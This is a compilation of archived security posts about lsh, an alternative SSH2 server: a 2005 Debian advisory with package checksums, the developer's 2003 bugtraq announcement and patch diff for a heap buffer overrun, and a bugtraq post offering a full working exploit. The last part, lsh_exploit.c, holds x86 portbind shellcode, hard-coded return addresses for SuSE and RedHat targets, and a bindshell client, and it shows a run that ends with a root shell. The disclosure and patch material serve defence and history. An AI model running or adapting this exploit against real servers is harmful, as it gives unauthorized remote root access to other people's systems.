=== Content from www.debian.org_9223c3b0_20250125_191456.html ===


---

[[Date Prev](msg00098.html)][[Date Next](msg00100.html)]
[[Thread Prev](msg00098.html)][[Thread Next](msg00100.html)]
[[Date Index](maillist.html#00099)]
[[Thread Index](threads.html#00099)]

# [SECURITY] [DSA 717-1] New lsh packages fix several vulnerabilities

---

* *To*: debian-security-announce@lists.debian.org (Debian Security Announcements)
* *Subject*: [SECURITY] [DSA 717-1] New lsh packages fix several vulnerabilities
* *From*: joey@infodrom.org (Martin Schulze)
* *Date*: Wed, 27 Apr 2005 11:57:53 +0200 (CEST)
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/m1DQjIn-000omXC%40finlandia.Infodrom.North.DE)Â [m1DQjIn-000omXC@finlandia.Infodrom.North.DE](msg00099.html)>
* *Reply-to*: debian-security@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

- --------------------------------------------------------------------------
Debian Security Advisory DSA 717-1                     security@debian.org
<http://www.debian.org/security/>                             Martin Schulze
April 27th, 2005                        <http://www.debian.org/security/faq>
- --------------------------------------------------------------------------

Package        : lsh-utils
Vulnerability  : buffer overflow, typo
Problem-Type   : remote
Debian-specific: no
CVE ID         : CAN-2003-0826 CAN-2005-0814
Debian Bug     : 211662

Several security relevant problems have been discovered in lsh, the
alternative secure shell v2 (SSH2) protocol server.  The Common
Vulnerabilities and Exposures project identifies the following
vulnerabilities:

CAN-2003-0826

    Bennett Todd discovered a heap buffer overflow in lshd which could
    lead to the execution of arbitrary code.

CAN-2005-0814

    Niels MÃ¶ller discovered a denial of service condition in lshd.

For the stable distribution (woody) these problems have been fixed in
version 1.2.5-2woody3.

For the unstable distribution (sid) these problems have been fixed in
version 2.0.1-2.

We recommend that you upgrade your lsh-server package.

Upgrade Instructions
- --------------------

wget url
        will fetch the file for you
dpkg -i file.deb
        will install the referenced file.

If you are using the apt-get package manager, use the line for
sources.list as given below:

apt-get update
        will update the internal database
apt-get upgrade
        will install corrected packages

You may use an automated update by adding the resources from the
footer to the proper configuration.

Debian GNU/Linux 3.0 alias woody
- --------------------------------

  Source archives:

    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5-2woody3.dsc>
      Size/MD5 checksum:      676 3650d5a597ac04ecaa8d1f2b0e6b9d82
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5-2woody3.diff.gz>
      Size/MD5 checksum:    22567 c6fc64008bb9b456a86746bccd9272a6
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5.orig.tar.gz>
      Size/MD5 checksum:   815420 12d06989f4d4ba190c3e2cb798982faa

  Architecture independent components:

    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils-doc_1.2.5-2woody3_all.deb>
      Size/MD5 checksum:   104504 6a822e59061ac550cf41f47b13f3f0b5

  Alpha architecture:

    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-client_1.2.5-2woody3_alpha.deb>
      Size/MD5 checksum:   283026 3d8b0e2210d0e9f692f1cc697a8469e2
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-server_1.2.5-2woody3_alpha.deb>
      Size/MD5 checksum:   397628 7b9507aff0901d903fba42198ce68ca2
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5-2woody3_alpha.deb>
      Size/MD5 checksum:   615864 0dcf2bdd2108685c006f3a5f79659cc0

  ARM architecture:

    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-client_1.2.5-2woody3_arm.deb>
      Size/MD5 checksum:   204972 4d9c0a5fb06cdc58476ba4e393c320d5
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-server_1.2.5-2woody3_arm.deb>
      Size/MD5 checksum:   281938 cb1fe5de3fefd84ec306d5660ab73aa8
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5-2woody3_arm.deb>
      Size/MD5 checksum:   432826 17d348691aeb9fd6e4d406d1fc7603f9

  Intel IA-32 architecture:

    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-client_1.2.5-2woody3_i386.deb>
      Size/MD5 checksum:   200572 2f201957e114361f71e6dc1a92fd115e
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-server_1.2.5-2woody3_i386.deb>
      Size/MD5 checksum:   276056 531502eef4d694bf5555863690b676fe
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5-2woody3_i386.deb>
      Size/MD5 checksum:   424898 13e38206f1380f09e5655496c3c6fb35

  Intel IA-64 architecture:

    Package does not build anymore and hence cannot be updated.

  HP Precision architecture:

    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-client_1.2.5-2woody3_hppa.deb>
      Size/MD5 checksum:   253306 98a90db7370b32882723dae19e9f1155
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-server_1.2.5-2woody3_hppa.deb>
      Size/MD5 checksum:   346696 9340d47f8c43eccf312a3613026702ed
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5-2woody3_hppa.deb>
      Size/MD5 checksum:   531998 6d99fd98d330c6aaeac141a12b93393a

  Motorola 680x0 architecture:

    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-client_1.2.5-2woody3_m68k.deb>
      Size/MD5 checksum:   191992 142c0bb523e2920b10c93bb0c2a0dcc6
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-server_1.2.5-2woody3_m68k.deb>
      Size/MD5 checksum:   264110 fd756369b155752c3da1467cf449700c
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5-2woody3_m68k.deb>
      Size/MD5 checksum:   410426 634ba2e045d83d9e9471c228bc03ff04

  Big endian MIPS architecture:

    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-client_1.2.5-2woody3_mips.deb>
      Size/MD5 checksum:   254274 fa19a60a16f046d77d82305d6a5154de
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-server_1.2.5-2woody3_mips.deb>
      Size/MD5 checksum:   345152 cf136326b5715e15df07ab2fc753941a
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5-2woody3_mips.deb>
      Size/MD5 checksum:   530488 1a16b1947e54c1ca71e6a8ac650095e3

  Little endian MIPS architecture:

    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-client_1.2.5-2woody3_mipsel.deb>
      Size/MD5 checksum:   252102 38e0aa3dc3d4d072d0ed56da4ac1e5e0
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-server_1.2.5-2woody3_mipsel.deb>
      Size/MD5 checksum:   342190 5e48648c9a9aa09906310632e2e5ac1a
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5-2woody3_mipsel.deb>
      Size/MD5 checksum:   524170 a7dcfd7b9dc81f251cca85403b3ad00e

  PowerPC architecture:

    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-client_1.2.5-2woody3_powerpc.deb>
      Size/MD5 checksum:   216766 2893efdf7bb60c72a534a2ddd977fe81
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-server_1.2.5-2woody3_powerpc.deb>
      Size/MD5 checksum:   299230 b27cff9ac3d3185a3008c513bcd38eb8
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5-2woody3_powerpc.deb>
      Size/MD5 checksum:   462198 2caff23061d96aaa4705189e22cb607e

  IBM S/390 architecture:

    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-client_1.2.5-2woody3_s390.deb>
      Size/MD5 checksum:   220930 773decc70ef660ad4c182515a34c47f1
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-server_1.2.5-2woody3_s390.deb>
      Size/MD5 checksum:   307688 085214ff39a59fbce17e5b3d4003e706
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5-2woody3_s390.deb>
      Size/MD5 checksum:   483128 e7f4ac5d57e0978ebc606dadfbbfc520

  Sun Sparc architecture:

    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-client_1.2.5-2woody3_sparc.deb>
      Size/MD5 checksum:   207324 3fb7a3915e83e7400ad67c3c77b06557
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-server_1.2.5-2woody3_sparc.deb>
      Size/MD5 checksum:   287258 a235fe132382a9c14c7ef1f937700eb8
    <http://security.debian.org/pool/updates/main/l/lsh-utils/lsh-utils_1.2.5-2woody3_sparc.deb>
      Size/MD5 checksum:   451722 eb906f7f892400a91c6904b3b4bc9dc5

  These files will probably be moved into the stable distribution on
  its next update.

- ---------------------------------------------------------------------------------
For apt-get: deb <http://security.debian.org/> stable/updates main
For dpkg-ftp: ftp://security.debian.org/debian-security dists/stable/updates/main
Mailing list: debian-security-announce@lists.debian.org
Package info: `apt-cache show <pkg>' and <http://packages.debian.org/><pkg>

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.0 (GNU/Linux)

iD8DBQFCb2IgW5ql+IAeqTIRAgL9AJ93gUYC7BbPW60iV47u7ck6sZzK8QCeNg5r
n/XdX+/a+e2n62Uh6fe1QmA=
=vTP0
-----END PGP SIGNATURE-----

```

---



=== Content from marc.info_f25e65a1_20250125_191449.html ===

```
[[prev in list](?l=bugtraq&m=106407252310293&w=2)] [[next in list](?l=bugtraq&m=106407417011430&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    LSH: Buffer overrun and remote root compromise in lshd
From:       [nisse () lysator ! liu ! se (Niels =?iso-8859-1?q?M=F6ller?=)](?a=91144816900001&r=1&w=2)
Date:       [2003-09-20 8:58:55](?l=bugtraq&r=1&w=2&b=200309)
[Download RAW [message](?l=bugtraq&m=106407188509874&q=mbox) or [body](?l=bugtraq&m=106407188509874&q=raw)]

A security hole of the worst kind have been found in lshd. All
versions up to 1.4.2 and all versions in the 1.5.x series up to 1.5.2
are affected.

The primary threat is remote root compromise of the lshd server. Some
exploits programs have been published. It is also likely that a
malicious ssh server can exploit the lsh client.

All users of lsh servers and clients are strongly advised to upgrade
to 1.4.3 (stable) or 1.5.3 (development version, with the usual
caveats), and to immediately disable lshd service until the program
is upgraded.

For further details and instructions, see the attached announcement of
the new versions. (Also note that as usual, the releases and the
1.4.2-1.4.3 patch file are signed properly, even if this message
isn't).

Regards,
/Niels

X-From-Line: lsh-bugs-admin@lists.lysator.liu.se  Sat Sep 20 10:31:06 2003
Return-Path: <lsh-bugs-admin@lists.lysator.liu.se>
Delivered-To: nisse@lysator.liu.se
Received: from tokaimura.lysator.liu.se (localhost [127.0.0.1])
	by mail.lysator.liu.se (Postfix) with ESMTP
	id EBD2E534DB; Sat, 20 Sep 2003 10:31:05 +0200 (MEST)
Delivered-To: mailmanalias-post+lsh-bugs@lysator.liu.se
Received: by mail.lysator.liu.se (Postfix, from userid 1646)
	id BC1B552FFB; Sat, 20 Sep 2003 10:30:33 +0200 (MEST)
Received: from fafner.lysator.liu.se (fafner.lysator.liu.se [130.236.254.31])
	by mail.lysator.liu.se (Postfix) with ESMTP id EB6782E912
	for <lsh-bugs@lists.lysator.liu.se>; Sat, 20 Sep 2003 10:30:31 +0200 (MEST)
Received: (from nisse@localhost)
	by fafner.lysator.liu.se (8.12.9/8.12.8) id h8K8UUOX013573;
	Sat, 20 Sep 2003 10:30:30 +0200 (MEST)
X-Authentication-Warning: fafner.lysator.liu.se: nisse set sender to nisse@lysator.liu.se using -f
To: lsh-bugs@lists.lysator.liu.se
Subject: ANNOUNCE: lsh-1.4.3 and lsh-1.5.3
From: nisse@lysator.liu.se (Niels =?iso-8859-1?q?M=F6ller?=)
Message-ID: <nnad8z980q.fsf@fafner.lysator.liu.se>
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
X-Spam-Status: No, hits=-3.8 required=5.0
	tests=AWL,PATCH_UNIFIED_DIFF,USER_AGENT_GNUS_UA,X_AUTH_WARNING
	version=2.55-lysator_tokaimura_1.1
X-Spam-Level:
X-Spam-Checker-Version: SpamAssassin 2.55-lysator_tokaimura_1.1 (1.174.2.19-2003-05-19-exp)
Sender: lsh-bugs-admin@lists.lysator.liu.se
Errors-To: lsh-bugs-admin@lists.lysator.liu.se
X-BeenThere: lsh-bugs@lists.lysator.liu.se
X-Mailman-Version: 2.0.13
Precedence: bulk
List-Unsubscribe: <<http://lists.lysator.liu.se/mailman/listinfo/lsh-bugs>>,
	<mailto:lsh-bugs-request@lists.lysator.liu.se?subject=unsubscribe>
List-Id: Discussions about lsh <lsh-bugs.lists.lysator.liu.se>
List-Post: <mailto:lsh-bugs@lists.lysator.liu.se>
List-Help: <mailto:lsh-bugs-request@lists.lysator.liu.se?subject=help>
List-Subscribe: <<http://lists.lysator.liu.se/mailman/listinfo/lsh-bugs>>,
	<mailto:lsh-bugs-request@lists.lysator.liu.se?subject=subscribe>
List-Archive: <<http://lists.lysator.liu.se/pipermail/lsh-bugs/>>
Date: 20 Sep 2003 10:30:29 +0200
Lines: 123
Xref: fafner.lysator.liu.se mail.psst:1371
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

All lsh versions prior to lsh-1.4.3, as well as lsh-1.5, lsh-1.5.1 and
lsh-1.5.2, have a *buffer overrun* bug. This bug can lead to remote
root compromise of the lshd daemon, and it can most likely also let a
malicious server execute arbitrary code in the lsh client.

And the affected code is run before either host or user autentication.

The stable release lsh-1.4.3 and the development release lsh-1.5.3
both fix this bug, and two other bugs of similar character (but
different consequences) which were found when greping the code for
similar mistakes.

All users of lsh and lshd should upgrade, and in case you can't
upgrade lshd immediately, you are *strongly* advised to disable lshd
service.

Credit is due to Bennett Todd, who reported a crash which turned out
to be a buffer overrun. Example exploit programs have been posted to
the full-disclosure mailinglist.

NEWS for lsh-1.4.3:

	Fixed heap buffer overrun with potential remote root
	compromise. Initial bug report by Bennett Todd.

	Fixed a similar bug in the check for channel number allocation
	failure in the handling of channel_open, and in the
	experimental client SRP code.

	Backported lshd setsid fix from lsh-1.5. Should call setsid
	both in the pty and non-pty cases.

	Updated the code to compile with automake-1.7.3 and
	scsh-0.6.0.

The NEWS entry for lsh-1.5.3 is similar, but since it belongs to the
development branch, it also contains some new experimental code,

News for the 1.5.3 release

	Fixed heap buffer overrun with potential remote root
	compromise. Initial bug report by Bennett Todd.

	Fixed a similar bug in the check for channel number allocation
	failure in the handling of channel_open, and in the
	experimental client SRP code.

	lshd now has an experimental mode similar to telnet, where it
	accepts the 'none' authentication method and automatically
	disables services such as X and TCP forwarding. This can be
	useful in environment where it's required that /bin/login or
	some other program handle authentication and session setup
	(e.g. handle security contexts and so on).

If you need a bug-fix-only update, you are advised to either stay with
lsh-1.4.3, or apply the relevant three lines of the 1.4.3 patch,
included below, to your 1.5.2 tree.

The releases can be downloaded from

  <http://www.lysator.liu.se/~nisse/archive/lsh-1.4.3.tar.gz>
  <http://www.lysator.liu.se/~nisse/archive/lsh-1.4.2-1.4.3.diff.gz>
  <http://www.lysator.liu.se/~nisse/archive/lsh-1.5.3.tar.gz>

  ftp://ftp.lysator.liu.se/pub/security/lsh/lsh-1.4.3.tar.gz
  ftp://ftp.lysator.liu.se/pub/security/lsh/lsh-1.4.2-1.4.3.diff.gz
  ftp://ftp.lysator.liu.se/pub/security/lsh/lsh-1.5.3.tar.gz

Regards,
/Niels

diff -urN lsh-1.4.2/src/channel_commands.c lsh-1.4.3/src/channel_commands.c
--- lsh-1.4.2/src/channel_commands.c	Thu Sep 27 08:29:44 2001
+++ lsh-1.4.3/src/channel_commands.c	Fri Sep 19 14:15:37 2003
@@ -57,6 +57,7 @@
 		      make_channel_open_exception(
 			SSH_OPEN_RESOURCE_SHORTAGE,
 			"Allocating a local channel number failed."));
+      return;
     }

   channel = NEW_CHANNEL(self, connection, index, &request);
diff -urN lsh-1.4.2/src/client_keyexchange.c lsh-1.4.3/src/client_keyexchange.c
--- lsh-1.4.2/src/client_keyexchange.c	Wed Mar 13 17:05:28 2002
+++ lsh-1.4.3/src/client_keyexchange.c	Fri Sep 19 16:37:59 2003
@@ -268,6 +268,7 @@
     {
       lsh_string_free(salt);
       disconnect_kex_failed(connection, "Bye");
+      return;
     }

   mpz_init(x);
@@ -282,8 +283,11 @@
   mpz_clear(x);

   if (!response)
-    PROTOCOL_ERROR(connection->e,
-		   "SRP failure: Invalid public value from server.");
+    {
+      PROTOCOL_ERROR(connection->e,
+		     "SRP failure: Invalid public value from server.");
+      return;
+    }

   C_WRITE_NOW(connection, response);

--- lsh-1.4.2/src/read_line.c	Fri Aug  4 01:51:32 2000
+++ lsh-1.4.3/src/read_line.c	Fri Sep 19 14:22:29 2003
@@ -98,6 +98,8 @@
       /* Too long line */
       EXCEPTION_RAISE(self->e,
 		      make_protocol_exception(0, "Line too long."));
+
+      return available;
     }

   /* Ok, now we have a line. Copy it into the buffer. */
_______________________________________________
lsh-bugs mailing list
lsh-bugs@lists.lysator.liu.se
<http://lists.lysator.liu.se/mailman/listinfo/lsh-bugs>

[[prev in list](?l=bugtraq&m=106407252310293&w=2)] [[next in list](?l=bugtraq&m=106407417011430&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
AddÂ aÂ list |
SponsoredÂ byÂ [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_016bcbdc_20250125_191449.html ===

```
[[prev in list](?l=bugtraq&m=106398718909274&w=2)] [[next in list](?l=bugtraq&m=106399528518704&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Remote root vuln in lsh 1.4.x
From:       [Haggis <haggis () learningshophull ! co ! uk>](?a=106397728900001&r=1&w=2)
Date:       [2003-09-19 13:01:24](?l=bugtraq&r=1&w=2&b=200309)
[Download RAW [message](?l=bugtraq&m=106398939512178&q=mbox) or [body](?l=bugtraq&m=106398939512178&q=raw)]

After reading about a theoretical remote hole in OpenSSH and many detractors
smugly saying that they weren't vulnerable because they run LSH (a free
alternative), I'd like to present a working remote root exploit against LSH
version 1.4.x.

Enjoy.

[["lsh_exploit.c" (text/x-csrc)]](?l=bugtraq&m=106398939512178&q=p3)

/*
  Rough and ready exploit for lsh 1.4.x (other versions ?)
  by Haggis aka Carl Livitt - carl.learningshophull@co@uk

  Spawns bindshell on port 45295 of remote host.

  I suspect the overflow that this exploits is actually part
  of the liboop library that lsh uses... I haven't even looked.
  I just wanted to get this out the door to stop all the lsh
  lovers crooning about how they weren't getting 0wn3d like
  the openssh users might be.

  Yes, this 0day is real. Yes, it's pre-authentication.

  Handily, it also bypasses non-exec stack protection as the
  shellcode is on the heap.

  NOTE: This 0day public exploit _only_ works if it's the first
  thing to connect to the lshd daemon after it has been started.
  Any other time, it is just a DoS. Run it a few times against
  a host running lshd to see what I mean.

  Greets to B-r00t, kraft, marshal-l, ruxor, force5 and everyone
  else on #cheese at doris.scriptkiddie.net.

  ----

  haggis@sol:~/exploits/research/lsh/lsh-1.4.2/src> netcat localhost 22
  SSH-2.0-lshd_1.4.1 lsh - a free ssh

  haggis@sol:~/exploits/research/lsh/lsh-1.4.2/src> ./lsh_exploit -t localhost
  LSH 1.4.x (others?) exploit by Haggis (haggis@haggis.kicks-ass.net)

  [-] Building exploit buffer...
  [-] Sending exploit string...
  [-] Sleeping...
  [-] Connecting to bindshell...
  [-] Success!!! You should now be r00t on localhost
  id
  uid=0(root) gid=0(root) groups=0(root)

  ----
*/

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netdb.h>
#include <time.h>
#include <stdarg.h>

#define SSH_PORT 22
#define SIZ 8096
#define EXPLOIT_BUF_SIZE 1536		// just approximate - works well enough
#define NOPS_LEN 1600

// So I ripped this from one of my previous exploits for speed...
//
// The following shellcode had 0x3f (?) chars in it which
// cause termination of our HTTP GET before the whole
// shellcode is written to the stack. The 0x3f's are
// needed because they are the dup2() syscall numbers. So,
// I've changed them to 0x3e's and INC'd them before doing
// an INT 0x80. Other than that, this shellcode is eSDee's.
// --------
// linux x86 shellcode by eSDee of Netric ([www.netric.org](http://www.netric.org))
// 200 byte - forking portbind shellcode - port=0xb0ef(45295)
char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
"\x06\x51\xb1\x01\x51\xb1\x02\x51"
"\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
"\x89\xc1\x31\xc0\x31\xdb\x50\x50"
"\x50\x66\x68\xb0\xef\xb3\x02\x66"
"\x53\x89\xe2\xb3\x10\x53\xb3\x02"
"\x52\x51\x89\xca\x89\xe1\xb0\x66"
"\xcd\x80\x31\xdb\x39\xc3\x74\x05"
"\x31\xc0\x40\xcd\x80\x31\xc0\x50"
"\x52\x89\xe1\xb3\x04\xb0\x66\xcd"
"\x80\x89\xd7\x31\xc0\x31\xdb\x31"
"\xc9\xb3\x11\xb1\x01\xb0\x30\xcd"
"\x80\x31\xc0\x31\xdb\x50\x50\x57"
"\x89\xe1\xb3\x05\xb0\x66\xcd\x80"
"\x89\xc6\x31\xc0\x31\xdb\xb0\x02"
"\xcd\x80\x39\xc3\x75\x40\x31\xc0"
"\x89\xfb\xb0\x06\xcd\x80\x31\xc0"
"\x31\xc9\x89\xf3\xb0\x3e\xfe\xc0\xcd\x80"
"\x31\xc0\x41\xb0\x3e\xfe\xc0\xcd\x80\x31"
"\xc0\x41\xb0\x3e\xfe\xc0\xcd\x80\x31\xc0"
"\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x8b\x54\x24"
"\x08\x50\x53\x89\xe1\xb0\x0b\xcd"
"\x80\x31\xc0\x40\xcd\x80\x31\xc0"
"\x89\xf3\xb0\x06\xcd\x80\xeb\x99";

struct
{
	char *platform;
	unsigned long retAddr;
}

targets[]=
{
	{ "SuSE 8.1 - LSH v1.4.x (default)", 0x0809f030},
	{ "RedHat 7.3 - LSH v1.4.x", 0x0809d620},
	NULL
};

void my_send(int, char *, ...);
void my_recv(int);
int connect_to_host(int);
void my_sleep(int n);
int do_bind_shell();

struct hostent *hostStruct;
char buf[SIZ], host[SIZ]="\0";
int useTarget=0;

// yeah yeah, i could enumerate the targets from the
// struct above. Whatever.
char usage[]=
"Usage: ./lsh_exploit -t <host> [-T host_type]\n\n"
"Available types are:\n"
"     0. SuSE 8.1 / LSH 1.4.x (default)\n"
"     1. RedHat 7.3 / LSH 1.4.x\n\n";

main(int argc, char **argv)
{
	int ch, i, targetSock;
	unsigned long *retPtr;
	char *charRetPtr;

	printf("LSH 1.4.x (others?) exploit by Haggis (haggis@haggis.kicks-ass.net)\n\n");
	while((ch=getopt(argc, argv, "t:T:h"))!=-1) {
		switch(ch) {
			case 't':
				strncpy(host, optarg, SIZ-1);
				break;
			case 'T':
				useTarget=atoi(optarg);
				break;
			case 'h':
			default:
				printf("%s\n",usage);
				printf("Available platforms:\n");
				for(i=0;targets[i].platform;i++)
					printf("%2d. %s\n", i, targets[i].platform);
				printf("\n");
				exit(0);
				break;
		}
	}

	if(host[[0]](#0)=='\0') {
		printf("[*] You must specify a host!\n");
		exit(1);
	}
	if((hostStruct=gethostbyname(host))==NULL) {
		printf("[*] Couldn't resolve host %s\nUse '%s -h' for help\n", host,argv[[0]](#0));
		exit(1);
	}

	if((targetSock=connect_to_host(SSH_PORT))==-1) {
		printf("[*] Couln't connect to host %s\n", host);
		exit(1);
	}

// check port 45295 just incase we've already successfuly exploited this host
	if(do_bind_shell()==1) {
		exit(0);
	}
	printf("[-] Building exploit buffer...\n");
	my_recv(targetSock);
	retPtr=(unsigned long *)buf;
	for(i=0;i<EXPLOIT_BUF_SIZE/4;i++)
		*(retPtr++)=targets[useTarget].retAddr;
	for(i=0;i<NOPS_LEN/4;i++)
		*(retPtr++)=(unsigned long)0x90909090;
	charRetPtr=(unsigned char *)retPtr;
	memcpy(charRetPtr, shellcode, strlen(shellcode));
	*(charRetPtr+strlen(shellcode))='\n';
	*(charRetPtr+strlen(shellcode)+1)='\0';
	printf("[-] Sending exploit string...\n");
	my_send(targetSock, buf);
	close(targetSock);
	printf("[-] Sleeping...\n");
	my_sleep(100000);
	printf("[-] Connecting to bindshell...\n");
	if(do_bind_shell()==-1)
		printf("[*] Could not connect to %s - the exploit failed\n", host);
	exit(0);
}

int do_bind_shell()
{
	fd_set rfds;
	int sock,retVal,r;

	if((sock=connect_to_host(45295))==-1)
		return -1;

	printf("[-] Success!!! You should now be r00t on %s\n", host);
	do {
		FD_ZERO(&rfds);
		FD_SET(0, &rfds);
		FD_SET(sock, &rfds);
		retVal=select(sock+1, &rfds, NULL, NULL, NULL);
		if(retVal) {
			if(FD_ISSET(sock, &rfds)) {
												  // bad!
				buf[(r=recv(sock, buf, SIZ-1,0))]='\0';
				printf("%s", buf);
			}
			if(FD_ISSET(0, &rfds)) {
				buf[(r=read(0, buf, SIZ-1))]='\0';// bad!
				send(sock, buf, strlen(buf), 0);
			}

		}
	} while(retVal && r);						  // loop until connection terminates

	close(sock);
	return 1;
}

// Given a port number, connects to an already resolved hostname...
// connects a TCP stream and returns a socket number (or returns error)
int connect_to_host(int p)
{
	int sock;
	struct sockaddr_in saddr;

	if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
		return -1;
	memset((void *)&saddr, 0, sizeof(struct sockaddr_in));
	saddr.sin_family=AF_INET;
	saddr.sin_addr.s_addr=*((unsigned long *)hostStruct->h_addr_list[[0]](#0));
	saddr.sin_port=htons(p);
	if(connect(sock, (struct sockaddr *)&saddr, sizeof(saddr))<0) {
		close(sock);
		return -1;
	} else
	return sock;
}

// Handy little function to send formattable data down a socket.
void my_send(int s, char *b, ...)
{
	va_list ap;
	char *buf;

	va_start(ap,b);
	vasprintf(&buf,b,ap);
	send(s,buf,strlen(buf),0);
	va_end(ap);
	free(buf);
}

// Another handy function to read data from a socket.
void my_recv(int s)
{
	int len;
	char buf[SIZ];

	len=recv(s, buf, SIZ-1, 0);
	buf[len]=0;
}

// Wrapper for nanosleep()... just pass 'n' nanoseconds to it.
void my_sleep(int n)
{
	struct timespec t;
	t.tv_sec=0;
	t.tv_nsec=n;
	nanosleep(&t,&t);
}

[[prev in list](?l=bugtraq&m=106398718909274&w=2)] [[next in list](?l=bugtraq&m=106399528518704&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
AddÂ aÂ list |
SponsoredÂ byÂ [KoreLogic](http://www.korelogic.com/)


